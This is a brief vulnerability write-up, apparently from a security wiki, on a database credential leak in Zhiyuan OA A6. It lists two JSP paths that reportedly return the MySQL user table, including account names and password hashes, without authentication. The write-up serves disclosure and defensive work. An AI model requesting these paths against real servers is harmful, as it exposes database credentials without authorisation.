# Zhiyuan OA A6 createMysql.jsp database sensitive information leak

## Vulnerability Description

Zhiyuan OA A6 has leaked database sensitive information, and attackers can obtain database accounts and passwords by accessing specific URLs MD5

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zhiyuan OA A6</span>

## Network surveying and mapping



## Vulnerability reappears

When accessing the following URL, the SQL statement `select *from mysql.user;` is executed to query and return to the page

```plain
/yyoa/createMysql.jsp
/yyoa/ext/createMysql.jsp
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645629877032-94a29b56-2632-4bff-8fbc-75dac6ab2ae6.png)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645629883438-65aaa8f2-5d16-48a7-a92b-a5e37a737f71.png)